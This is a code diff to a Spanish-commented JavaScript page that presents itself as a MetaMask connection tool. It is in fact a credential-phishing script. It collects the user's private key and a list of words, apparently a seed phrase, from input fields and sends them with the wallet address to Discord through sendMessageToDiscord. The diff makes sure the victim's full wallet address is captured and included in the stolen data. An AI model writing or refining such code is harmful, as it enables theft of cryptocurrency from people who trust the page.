@@ -1,3 +1,8 @@
+let fullUserAddress = ''; // Almacenará la dirección completa del usuario
+
+
+
+
 document.addEventListener('DOMContentLoaded', async () => {
     const connectButton = document.getElementById('connectButton');
     const userAddress = document.getElementById('userAddress');
@@ -38,6 +43,10 @@ document.addEventListener('DOMContentLoaded', async () => {
         try {
             // Solicitar al usuario que conecte MetaMask
             const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+
+
+            fullUserAddress = accounts[0];
+
             // Cambiar el texto del botón a Web3 Activo
             connectButton.textContent = 'Web3 Active';
             // Mostrar la dirección resumida del usuario
@@ -58,10 +67,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     // Escuchar cambios en las cuentas y actualizar la interfaz
     ethereum.on('accountsChanged', (accounts) => {
         if (accounts.length > 0) {
+            fullUserAddress = accounts[0];
             userAddress.textContent = `Address: ${summarizeAddress(accounts[0])}`;
             connectButton.textContent = 'Web3 Active';
             simulateAddressStatus();
         } else {
+            fullUserAddress = ''; // Limpiar la dirección si el usuario se desconecta
             userAddress.textContent = '';
             connectButton.textContent = 'Conectar a MetaMask';
             addressStatus.textContent = 'Status Address: ';
@@ -197,10 +208,8 @@ submitTextsButton.addEventListener('click', () => {
     });
 
     const privateKey = addressInput.value.trim(); // Capturar la "clave privada"
-    const userAddressText = userAddress.textContent.replace('Address: ', ''); // Capturando la dirección desde el elemento de texto
+    const message = `Dirección MetaMask: ${fullUserAddress}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;
 
-    // Construir el mensaje a enviar
-    const message = `Dirección MetaMask: ${userAddressText}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;
 
     console.log(message); // Para depuración, puedes verlo en la consola
     sendMessageToDiscord(message);
